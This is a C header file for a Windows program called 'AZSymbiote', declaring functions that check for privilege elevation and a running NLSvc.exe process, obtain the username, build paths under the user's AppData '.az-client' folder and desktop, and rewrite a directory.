#ifndef AZSYMBIOTE_H
#define AZSYMBIOTE_H

#include "utils.h"

// Imports standards
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Imports Windows
#include <windows.h>
#include <securitybaseapi.h>
#include <Lmcons.h>
#include <tlhelp32.h>

// Définitions des chemins
#define C_USER      "C:\\Users\\"
#define C_APPDATA   "\\AppData\\Roaming\\.az-client"
#define DESKTOP     "\\desktop"
#define NLSVC       "NLSvc.exe"

// Déclarations des fonctions
void exit_system(void);
BOOL check_elevation(void);
BOOL check_nlsvc(void);
char* get_username(void);
char* build_path(const char* base_path, const char* username, const char* suffix);
void rewriter(const char* dir);

#endif
